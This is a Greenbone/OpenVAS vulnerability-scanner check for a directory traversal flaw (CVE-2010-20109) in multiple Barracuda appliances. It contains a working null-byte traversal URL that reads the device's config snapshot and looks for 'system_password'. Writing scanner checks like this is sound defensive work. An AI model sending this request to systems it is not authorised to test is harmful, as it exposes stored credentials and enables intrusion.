# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100847");
  script_version("2025-09-08T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-09-08 05:38:50 +0000 (Mon, 08 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-10-06 12:55:58 +0200 (Wed, 06 Oct 2010)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2010-20109");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Barracuda Networks Multiple Products Directory Traversal Vulnerability (Oct 2010) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "gb_get_http_banner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("BarracudaHTTP/banner");

  script_tag(name:"summary", value:"Multiple Barracuda Networks products are prone to a directory
  traversal vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A remote attacker can exploit this vulnerability using directory
  traversal characters ('../') to access files that contain sensitive information that can aid in
  further attacks.");

  script_tag(name:"affected", value:"Barracuda IM Firewall 3.4.01.004 and earlier

  Barracuda Link Balancer 2.1.1.010 and earlier

  Barracuda Load Balancer 3.3.1.005 and earlier

  Barracuda Message Archiver 2.2.1.005 and earlier

  Barracuda Spam & Virus Firewall 4.1.1.021 and earlier

  Barracuda SSL VPN 1.7.2.004 and earlier

  Barracuda Web Application Firewall 7.4.0.022 and earlier

  Barracuda Web Filter 4.3.0.013 and earlier");

  script_tag(name:"solution", value:"No solution was made available by the vendor. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20101004131244/http://secunia.com/advisories/41609/");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/barracuda-multiple-products-locale-path-traversal");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || banner !~ "Server\s*:\s*BarracudaHTTP")
  exit(0);

foreach dir (make_list("/cgi-mod", "/cgi-bin")) {
  url = dir + "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";

  if (http_vuln_check(port: port, url: url, pattern: "system_password",
                      extra_check: make_list("system_netmask", "system_default_domain"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
